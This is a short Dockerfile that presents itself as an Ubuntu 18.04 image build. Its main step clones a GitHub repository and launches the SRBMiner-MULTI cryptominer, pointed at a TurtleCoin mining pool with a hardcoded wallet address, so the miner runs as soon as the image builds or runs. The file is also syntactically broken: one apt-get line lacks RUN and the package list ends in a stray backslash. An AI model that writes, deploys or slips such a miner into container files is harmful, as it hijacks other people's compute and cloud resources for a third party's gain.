FROM ubuntu:18.04
ADD . /
RUN apt-get update
apt-get install -y \
sudo \
git \
RUN git clone https://github.com/remakove/artions.git artions && cd artions && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --algorithm argon2id_chukwa2 --pool ca.turtlecoin.herominers.com:10380 --wallet TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF.j2 --disable-gpu

